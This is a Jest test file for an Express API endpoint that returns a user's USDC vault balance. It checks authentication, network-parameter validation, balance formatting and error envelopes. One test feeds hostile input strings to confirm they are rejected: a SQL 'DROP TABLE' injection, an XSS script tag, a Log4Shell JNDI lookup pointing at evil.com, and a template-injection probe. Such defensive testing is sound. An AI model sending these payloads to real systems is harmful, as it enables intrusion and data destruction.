import request from 'supertest';
import express from 'express';
import jwt from 'jsonwebtoken';
import { createApp } from '../app.js';
import { VaultController } from './vaultController.js';
import { InMemoryVaultRepository, type VaultRepository } from '../repositories/vaultRepository.js';
import { errorHandler } from '../middleware/errorHandler.js';
import { validate } from '../middleware/validate.js';
import { stellarNetworkQuerySchema } from '../validators/networkSchema.js';
import { requestIdMiddleware } from '../middleware/requestId.js';
import { UnauthorizedError } from '../errors/index.js';

/**
 * Asserts the standard error envelope shape `{ success: false, error: { code, message }, requestId, timestamp }`.
 */
function expectErrorEnvelope(body: unknown, message: string | undefined, code: string): void {
  expect(body).toMatchObject({
    success: false,
    error: message === undefined ? { code } : { message, code },
  });
  expect(typeof (body as { requestId?: unknown }).requestId).toBe('string');
  expect(typeof (body as { timestamp?: unknown }).timestamp).toBe('string');
}

jest.mock('better-sqlite3', () => {
  return class MockDatabase {
    prepare() { return { get: () => null }; }
    exec() { }
    close() { }
  };
});

function createTestApp(vaultRepository: InMemoryVaultRepository, useJwtAuth = false) {
  const app = express();
  app.use(express.json());
  app.use(requestIdMiddleware);

  if (useJwtAuth) {
    // Mock JWT authentication for testing token-based auth
    app.use((req, res, next) => {
      const authHeader = req.headers['authorization'];
      if (authHeader?.startsWith('Bearer ')) {
        const token = authHeader.slice('Bearer '.length).trim();
        try {
          // Mock JWT verification (in real tests, this would use actual JWT logic)
          if (token === 'valid-token') {
            res.locals.authenticatedUser = {
              id: 'jwt-user-1',
              email: 'jwt-user@example.com',
            };
            next();
            return;
          } else if (token === 'expired-token') {
            next(new UnauthorizedError('Token expired', 'TOKEN_EXPIRED'));
            return;
          } else if (token === 'invalid-token') {
            next(new UnauthorizedError('Invalid token', 'INVALID_TOKEN'));
            return;
          }
        } catch {
          next(new UnauthorizedError('Invalid token', 'INVALID_TOKEN'));
          return;
        }
      }
      next(new UnauthorizedError('Authentication required'));
    });
  } else {
    // Mock requireAuth to accept essentially any user via x-user-id header
    app.use((req, res, next) => {
      const userId = (req.headers['x-user-id'] as string | undefined)?.trim();
      if (userId) {
        res.locals.authenticatedUser = {
          id: userId,
          email: `${userId}@example.com`,
        };
        next();
      } else {
        next(new UnauthorizedError('Authentication required'));
      }
    });
  }

  const vaultController = new VaultController(vaultRepository);
  app.get(
    '/api/vault/balance',
    validate({ query: stellarNetworkQuerySchema }),
    vaultController.getBalance.bind(vaultController),
  );

  app.use(errorHandler);
  return app;
}

describe('VaultController - getBalance', () => {
  describe('Authentication Tests', () => {
    it('returns 401 when no user is authenticated', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app).get('/api/vault/balance');
      expect(response.status).toBe(401);
      expectErrorEnvelope(response.body, 'Authentication required', 'UNAUTHORIZED');
    });

    it('returns 401 when x-user-id header is empty', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', '');

      expect(response.status).toBe(401);
      expectErrorEnvelope(response.body, 'Authentication required', 'UNAUTHORIZED');
    });

    it('accepts valid JWT token authentication', async () => {
      const repository = new InMemoryVaultRepository();
      await repository.create('jwt-user-1', 'contract-123', 'testnet');
      const app = createTestApp(repository, true);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('Authorization', 'Bearer valid-token');

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.data).toHaveProperty('balance_usdc');
    });

    it('returns 401 for expired JWT token', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository, true);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('Authorization', 'Bearer expired-token');

      expect(response.status).toBe(401);
      expectErrorEnvelope(response.body, 'Token expired', 'TOKEN_EXPIRED');
    });

    it('returns 401 for invalid JWT token', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository, true);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('Authorization', 'Bearer invalid-token');

      expect(response.status).toBe(401);
      expectErrorEnvelope(response.body, 'Invalid token', 'INVALID_TOKEN');
    });

    it('returns 401 for malformed Authorization header', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository, true);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('Authorization', 'InvalidFormat token');

      expect(response.status).toBe(401);
    });
  });

  describe('Validation Tests', () => {
    it('returns 404 when vault does not exist', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(404);
      expectErrorEnvelope(response.body, undefined, 'VAULT_NOT_FOUND');
      expect(response.body.error.message).toContain('Vault not found');
      expect(response.body.error.message).toContain('testnet'); // default network
    });

    it('returns 400 for invalid network parameter', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance?network=invalid')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(400);
      expectErrorEnvelope(response.body, 'Request validation failed', 'VALIDATION_ERROR');
      expect(response.body.error.details[0]).toMatchObject({
        field: 'query.network',
      });
    });

    it('returns 400 for empty network parameter', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance?network=')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(400);
      expectErrorEnvelope(response.body, undefined, 'VALIDATION_ERROR');
      expect(response.body.error.details[0]).toHaveProperty('field', 'query.network');
    });

    it('returns 400 for network parameter with only whitespace', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance?network=   ')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(400);
      expectErrorEnvelope(response.body, undefined, 'VALIDATION_ERROR');
      expect(response.body.error.details[0]).toHaveProperty('field', 'query.network');
    });

    it('accepts case-sensitive network parameters', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const testCases = [
        { network: 'TestNet', expectedStatus: 400 },
        { network: 'MAINNET', expectedStatus: 400 },
        { network: 'testnet', expectedStatus: 404 }, // valid but vault doesn't exist
        { network: 'mainnet', expectedStatus: 404 }, // valid but vault doesn't exist
      ];

      for (const testCase of testCases) {
        const response = await request(app)
          .get(`/api/vault/balance?network=${testCase.network}`)
          .set('x-user-id', 'user-1');

        expect(response.status).toBe(testCase.expectedStatus);
      }
    });
  });

  describe('Success Path Tests', () => {
    it('returns correctly formatted zero balance', async () => {
      const repository = new InMemoryVaultRepository();
      await repository.create('user-1', 'contract-123', 'testnet');

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(200);
      expect(response.body).toMatchObject({
        success: true,
        data: {
          balance_usdc: '0.0000000',
          contractId: 'contract-123',
          network: 'testnet',
          lastSyncedAt: null,
          stale: true,
        },
      });
    });

    it('returns correctly formatted positive balance', async () => {
      const repository = new InMemoryVaultRepository();
      const vault = await repository.create('user-2', 'contract-456', 'testnet');
      await repository.updateBalanceSnapshot(vault.id, 15000000n, new Date('2023-01-01T12:00:00Z'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-2');

      expect(response.status).toBe(200);
      expect(response.body).toMatchObject({
        success: true,
        data: {
          balance_usdc: '1.5000000',
          contractId: 'contract-456',
          network: 'testnet',
          lastSyncedAt: '2023-01-01T12:00:00.000Z',
          stale: true,
        },
      });
    });

    it('handles different network parameter correctly', async () => {
      const repository = new InMemoryVaultRepository();
      await repository.create('user-3', 'contract-mainnet', 'mainnet');

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance?network=mainnet')
        .set('x-user-id', 'user-3');

      expect(response.status).toBe(200);
      expect(response.body).toMatchObject({
        success: true,
        data: {
          balance_usdc: '0.0000000',
          contractId: 'contract-mainnet',
          network: 'mainnet',
          lastSyncedAt: null,
          stale: true,
        },
      });
    });
  });

  describe('Edge Cases and Error Handling', () => {
    it('handles very large balance values correctly', async () => {
      const repository = new InMemoryVaultRepository();
      const vault = await repository.create('user-large', 'contract-large', 'testnet');
      // Test with a very large balance (1 billion USDC)
      await repository.updateBalanceSnapshot(vault.id, 10000000000000000n, new Date('2023-01-01T12:00:00Z'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-large');

      expect(response.status).toBe(200);
      expect(response.body.data.balance_usdc).toBe('1000000000.0000000');
    });

    it('handles small fractional balances correctly', async () => {
      const repository = new InMemoryVaultRepository();
      const vault = await repository.create('user-small', 'contract-small', 'testnet');
      // Test with 0.0000001 USDC (1 stroop)
      await repository.updateBalanceSnapshot(vault.id, 1n, new Date('2023-01-01T12:00:00Z'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-small');

      expect(response.status).toBe(200);
      expect(response.body.data.balance_usdc).toBe('0.0000001');
    });

    it('returns 500 when repository throws unexpected error', async () => {
      const repository = new InMemoryVaultRepository();
      // Mock repository to throw an error
      const originalFindByUserId = repository.findByUserId;
      (repository as unknown as VaultRepository).findByUserId = () => Promise.reject(new Error('Database connection failed'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(500);
      expectErrorEnvelope(response.body, 'Failed to retrieve vault balance', 'INTERNAL_SERVER_ERROR');

      // Restore original method
      repository.findByUserId = originalFindByUserId;
    });

    it('handles malformed user IDs gracefully', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', '   '); // whitespace only

      expect(response.status).toBe(401);
    });
  });

  describe('Data Integrity and Security Tests', () => {
    it('ensures users cannot access other users vault data', async () => {
      const repository = new InMemoryVaultRepository();
      // Create vault for user-1
      await repository.create('user-1', 'contract-123', 'testnet');
      const vault2 = await repository.create('user-2', 'contract-456', 'testnet');
      await repository.updateBalanceSnapshot(vault2.id, 50000000n, new Date('2023-01-01T12:00:00Z'));

      const app = createTestApp(repository);
      
      // user-1 tries to access their own vault (should work)
      const response1 = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-1');
      
      expect(response1.status).toBe(200);
      expect(response1.body.data.contractId).toBe('contract-123');
      expect(response1.body.data.balance_usdc).toBe('0.0000000');

      // user-1 tries to access with different user ID (should get their own vault or 404)
      const response2 = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-2');
      
      expect(response2.status).toBe(200);
      expect(response2.body.data.contractId).toBe('contract-456'); // user-2's vault
      expect(response2.body.data.balance_usdc).toBe('5.0000000');
    });

    it('prevents network parameter injection attacks', async () => {
      const repository = new InMemoryVaultRepository();
      await repository.create('user-1', 'contract-123', 'testnet');
      const app = createTestApp(repository);

      const maliciousInputs = [
        'testnet; DROP TABLE vaults;',
        'testnet\x00\x00',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .get(`/api/vault/balance?network=${encodeURIComponent(input)}`)
          .set('x-user-id', 'user-1');

        expect(response.status).toBe(400);
        expectErrorEnvelope(response.body, undefined, 'VALIDATION_ERROR');
      }
    });

    it('validates response structure consistency', async () => {
      const repository = new InMemoryVaultRepository();
      const vault = await repository.create('user-1', 'contract-123', 'testnet');
      await repository.updateBalanceSnapshot(vault.id, 12345678n, new Date('2023-01-01T12:00:00Z'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(200);
      
      // Validate response structure
      expect(response.body).toEqual(expect.any(Object));
      expect(response.body.success).toBe(true);
      expect(response.body.data).toHaveProperty('balance_usdc');
      expect(response.body.data).toHaveProperty('contractId');
      expect(response.body.data).toHaveProperty('network');
      expect(response.body.data).toHaveProperty('lastSyncedAt');
      expect(response.body.data).toHaveProperty('stale');
      
      // Validate data types
      expect(typeof response.body.data.balance_usdc).toBe('string');
      expect(typeof response.body.data.contractId).toBe('string');
      expect(typeof response.body.data.network).toBe('string');
      expect(['string', 'null']).toContain(typeof response.body.data.lastSyncedAt);
      expect(typeof response.body.data.stale).toBe('boolean');
      
      // Validate balance format (should be decimal with 7 places)
      expect(response.body.data.balance_usdc).toMatch(/^\d+\.\d{7}$/);
    });
  });

  describe('Integration with App Router', () => {
    it('works when mounted through the main app router', async () => {
      const prevSecret = process.env.JWT_SECRET;
      process.env.JWT_SECRET = 'test-vault-integration-secret';
      try {
        const repository = new InMemoryVaultRepository();
        await repository.create('integration-user', 'contract-integration', 'testnet');
        
        const app = createApp({
          vaultRepository: repository,
          vaultReader: {
            readVault: jest.fn().mockResolvedValue({
              balance: 0n,
              maxDeduct: 0n,
              paused: false,
              usdcToken: 'GUSDC',
              settlement: 'GSETTLEMENT',
              ledger: 1,
            }),
          },
        });
        const token = jwt.sign({ sub: 'integration-user' }, process.env.JWT_SECRET, {
          algorithm: 'HS256',
        });
        
        const response = await request(app)
          .get('/api/vault/balance')
          .set('Authorization', `Bearer ${token}`);
        
        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
        expect(response.body.data).toHaveProperty('balance_usdc');
        expect(response.body.data).toHaveProperty('contractId');
      } finally {
        if (prevSecret === undefined) {
          delete process.env.JWT_SECRET;
        } else {
          process.env.JWT_SECRET = prevSecret;
        }
      }
    });

    it('maintains error structure consistency in full app context', async () => {
      const prevSecret = process.env.JWT_SECRET;
      process.env.JWT_SECRET = 'test-vault-integration-secret';
      try {
        const repository = new InMemoryVaultRepository();
        // Don't create vault to trigger 404
        
        const app = createApp({
          vaultRepository: repository,
          vaultReader: {
            readVault: jest.fn().mockResolvedValue({
              balance: 0n,
              maxDeduct: 0n,
              paused: false,
              usdcToken: 'GUSDC',
              settlement: 'GSETTLEMENT',
              ledger: 1,
            }),
          },
        });
        const token = jwt.sign({ sub: 'nonexistent-user' }, process.env.JWT_SECRET, {
          algorithm: 'HS256',
        });
        
        const response = await request(app)
          .get('/api/vault/balance')
          .set('Authorization', `Bearer ${token}`);
        
        expect(response.status).toBe(404);
        expectErrorEnvelope(response.body, undefined, 'VAULT_NOT_FOUND');
      } finally {
        if (prevSecret === undefined) {
          delete process.env.JWT_SECRET;
        } else {
          process.env.JWT_SECRET = prevSecret;
        }
      }
    });
  });

  describe('Response Format Consistency', () => {
    it('ensures all success responses have consistent structure', async () => {
      const repository = new InMemoryVaultRepository();
      const vault = await repository.create('user-consistency', 'contract-consistency', 'testnet');
      await repository.updateBalanceSnapshot(vault.id, 7777777n, new Date('2023-06-15T09:30:00Z'));
      
      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-consistency');
      
      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      
      // Verify required fields exist
      const requiredFields = ['balance_usdc', 'contractId', 'network', 'lastSyncedAt', 'stale'];
      requiredFields.forEach(field => {
        expect(response.body.data).toHaveProperty(field);
      });
      
      // Verify no extra fields
      const responseKeys = Object.keys(response.body.data);
      expect(responseKeys).toEqual(expect.arrayContaining(requiredFields));
      expect(responseKeys.length).toBe(requiredFields.length);
    });

    it('ensures all error responses have consistent structure', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);
      
      // Test 401 error
      const authResponse = await request(app).get('/api/vault/balance');
      expect(authResponse.status).toBe(401);
      expectErrorEnvelope(authResponse.body, undefined, 'UNAUTHORIZED');
      
      // Test 404 error
      const notFoundResponse = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'missing-user');
      expect(notFoundResponse.status).toBe(404);
      expectErrorEnvelope(notFoundResponse.body, undefined, 'VAULT_NOT_FOUND');
      
      // Test 400 error
      const validationResponse = await request(app)
        .get('/api/vault/balance?network=invalid')
        .set('x-user-id', 'user-1');
      expect(validationResponse.status).toBe(400);
      expectErrorEnvelope(validationResponse.body, undefined, 'VALIDATION_ERROR');
      expect(typeof validationResponse.body.error.message).toBe('string');
    });
  });
});